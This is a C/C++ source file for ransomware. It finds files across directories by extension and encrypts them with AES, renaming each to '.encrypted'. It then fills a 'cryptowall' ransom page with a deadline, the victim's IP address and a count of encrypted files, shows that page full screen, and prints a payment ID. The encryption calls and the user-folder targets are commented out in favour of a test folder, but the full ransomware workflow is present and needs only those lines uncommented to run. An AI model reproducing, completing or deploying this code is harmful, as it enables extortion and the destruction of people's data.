#include <time.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32
#include <lmcons.h>
#include <fileapi.h>
#include <windows.h>
#else
#include <dirent.h>
#include <unistd.h>
#endif

#include "headers/aes.h"
#include "headers/drm.h"
#include "headers/base64.h"
#include "headers/random.h"

void AES_encrypt(uint8_t* data, uint32_t size, const uint8_t* key) {
  AES_ctx ctx = AES_init_ctx(key);
  for (uint32_t i = 0; i < size / AES_BLOCKLEN; i++)
    AES_ECB_encrypt(&ctx, data + i * AES_BLOCKLEN);
}

void AES_decrypt(uint8_t* data, uint32_t size, const uint8_t* key) {
  AES_ctx ctx = AES_init_ctx(key);
  for (uint32_t i = 0; i < size / AES_BLOCKLEN; i++)
    AES_ECB_decrypt(&ctx, data + i * AES_BLOCKLEN);
}

void AES_stream_encrypt(char* filename, const uint8_t* key) {
  AES_ctx ctx = AES_init_ctx(key);
  FILE* file = fopen(filename, "rb+");
  fseek(file, 0, SEEK_END);
  uint32_t size = ftell(file);
  uint8_t* block = new uint8_t[AES_BLOCKLEN];
  for (uint32_t i = 0; i < size; i += AES_BLOCKLEN) {
    fseek(file, i, SEEK_SET);
    fread(block, 1, AES_BLOCKLEN, file);
    AES_ECB_encrypt(&ctx, block);
    fseek(file, i, SEEK_SET);
    fwrite(block, sizeof(uint8_t), AES_BLOCKLEN, file);
  }
  delete[] block;
  fclose(file);
  // Add .encrypted extension
  char* dest = new char[strlen(filename) + 11];
  strcpy(dest, filename);
  strcat(dest, ".encrypted");
  rename(filename, dest);
  delete[] dest;
}

void AES_stream_decrypt(char* filename, const uint8_t* key) {
  AES_ctx ctx = AES_init_ctx(key);
  FILE* file = fopen(filename, "rb+");
  fseek(file, 0, SEEK_END);
  uint32_t size = ftell(file);
  uint8_t* block = new uint8_t[AES_BLOCKLEN];
  // Remove .encrypted extension
  char* dest = new char[strlen(filename) + 1];
  strcpy(dest, filename);
  char* lastdot = strrchr(dest, '.');
  *lastdot = '\0';
  FILE* destfile = fopen(dest, "wb");
  for (uint32_t i = 0; i < size; i += AES_BLOCKLEN) {
    fseek(file, i, SEEK_SET);
    fread(block, 1, AES_BLOCKLEN, file);
    AES_ECB_decrypt(&ctx, block);
    fseek(destfile, i, SEEK_SET);
    if (i < (size - AES_BLOCKLEN))
      fwrite(block, sizeof(uint8_t), AES_BLOCKLEN, destfile);
    else
      fwrite(block, sizeof(uint8_t), AES_BLOCKLEN - block[AES_BLOCKLEN - 1], destfile);
  }
  delete[] block;
  delete[] dest;
  fclose(file);
  fclose(destfile);
  remove(filename);
}

unsigned int cant_files = 0;

// Encrypt file with the next extensions:
const char extensions[][7] = {
  "3ds", "3gp", "7z", "asm", "avi", "backup", "bak", "bat", "bin", "bmp",
  "cfg", "cmd", "c", "cpp", "css", "diff", "doc", "docx", "flv", "gci", "ggb",
  "gif", "gz", "h", "htm", "html", "i3d", "ico", "inf", "ini", "ino", "iso",
  "jar", "jpeg", "jpg", "js", "json", "m2", "md", "mkv", "mod", "mov", "mp3",
  "mp4", "mpeg", "mpg", "log", "odt", "pas", "pdf", "php", "png", "ppt",
  "pptx", "py", "rar", "raw", "rtf", "rpx", "sav", "sql", "svg", "swf", "tar",
  "txt", "vbs", "wav", "wma", "wmv", "xls", "xml", "xps", "zip"
};

bool isValidFile(char* file) {
  char* ext = strrchr(file, '.');
  if (ext == NULL) return false;
  ext++;
  bool res = false;
  for (int i = 0; i < (int)sizeof(extensions) && !res; i++)
    res = strcmp(ext, extensions[i]) == 0;
  return res;
}

/*
  To encrypt files using AES 256, the file size must be a multiple of 16 bytes
  This function adds 1 to 16 bytes to the file using ANSI X9.23 padding method
*/
void ANSI_X9_23(char* filename) {
  FILE* file = fopen(filename, "rb+");
  fseek(file, 0, SEEK_END);
  uint32_t size = ftell(file);
  uint8_t len = AES_BLOCKLEN - size % AES_BLOCKLEN;
  uint8_t* pad = new uint8_t[len];
  for (uint8_t i = 0; i < len - 1; i++)
    pad[i] = 0x00;
  pad[len - 1] = len;
  fwrite(pad, sizeof(uint8_t), len, file);
  rewind(file);
  fclose(file);
  delete[] pad;
}

void EncryptFile(char* fname, const uint8_t* key) {
  if (!isValidFile(fname)) return;
  printf("%s\n", fname);
  cant_files++;

  //ANSI_X9_23(fname);
  //AES_stream_encrypt(fname, key);

  /*char* dest = new char[strlen(fname) + 11];
  strcpy(dest, fname);
  strcat(dest, ".encrypted");
  AES_stream_decrypt(dest, key);
  delete[] dest;*/
}

void SearchFiles(const char* sDir, const uint8_t* key) {
#ifdef _WIN32
  WIN32_FIND_DATA fdFile;
  HANDLE hFind = NULL;
  char sPath[512];
  sprintf(sPath, "%s\\*.*", sDir); // Search all files
  hFind = FindFirstFile(sPath, &fdFile);
  do {
    if (strcmp(fdFile.cFileName, ".") != 0 && strcmp(fdFile.cFileName, "..") != 0) {
      // Build up file path
      sprintf(sPath, "%s\\%s", sDir, fdFile.cFileName);
      // Is it a file or folder?
      if (fdFile.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        SearchFiles(sPath, key); // Recursion
      else
        EncryptFile(sPath, key);
    }
  } while (FindNextFile(hFind, &fdFile)); // Find the next file
  FindClose(hFind); // Clean
#else
  DIR* dir = opendir(sDir);
  dirent* entry = readdir(dir);
  char path[512];
  while (entry != NULL) {
    if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
      sprintf(path, "%s/%s", sDir, entry->d_name);  
      if (entry->d_type == DT_DIR)
        SearchFiles(path, key);
      else
        EncryptFile(path, key);
    }
    entry = readdir(dir);
  }
  closedir(dir);
#endif
}

int main() {
  /// HIDE CONSOLE
#ifdef _WIN32
  FreeConsole();
#endif

  // Warning!!! This is all the security you will get.
  // Remove the line below under your own risk
  //if (KillSwitch()) exit(EXIT_FAILURE);

  /// GENERATE KEY
  char* id; unsigned int len;
  uint8_t* key = advandedRNG(id, len, time(NULL) ^ clock());

  /// SAVE KEY TO FILE
//  FILE* kfile = fopen("key.bin", "wb");
//  fwrite(key, sizeof(uint8_t), 32, kfile);
//  fclose(kfile);

  /// ENCRYPT FILES
#ifdef _WIN32
  DWORD length = UNLEN + 1;
  char username[length];
  GetUserName(username, &length);
  char* path = new char[length + 12];
  sprintf(path, "C:\\Users\\%s", username);

  /// Encrypt Files in those folders and subfolders:
  // Encrypt user folder
  //SearchFiles(path, key);
  // Encrypt example folder (use always two backslashes)
  //SearchFiles("..\\testfolder", key);
  SearchFiles("testfolder", key);
  // Encrypt disk "D:\"
  //SearchFiles("D:\\", key);
#else
  // On linux use a single slash
  //SearchFiles("../testfolder", key);
#endif

  delete[] key;

  /// GET TIME OF TOMORROW
  time_t timenow = time(NULL) + 24 * 60 * 60;
  tm* timeinfo = localtime(&timenow);
  unsigned int year = timeinfo->tm_year + 1900;
  unsigned int month = timeinfo->tm_mon + 1;

  /// ADD DATE TO FILE
#ifdef _WIN32
  FILE* cryptowall = fopen("cryptowall\\index.htm", "r+");
#else
  FILE* cryptowall = fopen("cryptowall/index.htm", "r+");
#endif
  fseek(cryptowall, 304, SEEK_SET);
  fprintf(cryptowall, "%02u-%02u-%02u %02u:%02u:%02u", year, month,
          timeinfo->tm_mday, timeinfo->tm_hour, timeinfo->tm_min, timeinfo->tm_sec);

  /// GET IP
  unsigned int ip[4];
#ifdef _WIN32
  system("getip.bat");
#else
  system("dig @resolver1.opendns.com A myip.opendns.com +short -4 > ip");
#endif
  FILE* loadip = fopen("ip", "r+");
  fscanf(loadip, "%u.%u.%u.%u", &ip[0], &ip[1], &ip[2], &ip[3]);
  fclose(loadip);

  /// ADD IP TO FILE
  fseek(cryptowall, 1775, SEEK_SET);
  // ip may have different lengths: 0.0.0.0 / 255.255.255.255, pad with spaces
  char ipbuffer[16] = "               ";
  int ip_pad = sprintf(ipbuffer, "%u.%u.%u.%u", ip[0], ip[1], ip[2], ip[3]);
  ipbuffer[ip_pad] = ' '; // Remove '\0' set by sprintf
  fwrite(ipbuffer, sizeof(char), 15, cryptowall);
  remove("ip");

  /// ADD Total Files Encrypted
  fseek(cryptowall, 1965, SEEK_SET);
  char cfbuffer[32];
  strcpy(cfbuffer, "      ");
  int cf_pad;
  if (cant_files > 1000)
    cf_pad = sprintf(cfbuffer, "%u,%03u", cant_files / 1000, cant_files % 1000);
  else
    cf_pad = sprintf(cfbuffer, "%u", cant_files % 1000);
  cfbuffer[cf_pad] = ' '; // Remove '\0' set by sprintf
  fwrite(cfbuffer, sizeof(char), 6, cryptowall);
  fclose(cryptowall);

  /// SHOW MESSAGE FULLSCREEN
#ifdef _WIN32
  system("start /b cmd /c \"C:\\Program Files\\Mozilla Firefox\\firefox.exe\" -new-window cryptowall\\index.htm");
  system("fullscreen.vbs");
#else
  system("firefox -new-window cryptowall/index.htm &");
  sleep(2);
  system("xdotool key Alt+Tab");
  sleep(1);
  system("xdotool key F11");
#endif

  printf("\nAfter payment, use the next id to generate your key: ");
  PrintBase64(id, len);
  printf("You can also use it to decrypt one file for free!\n");

  /// SAVE ID TO FILE
  FILE* idfile = fopen("ID.txt", "wb");
  fwrite(id, sizeof(uint8_t), len, idfile);
  fclose(idfile);
  delete[] id;
  return 0;
}
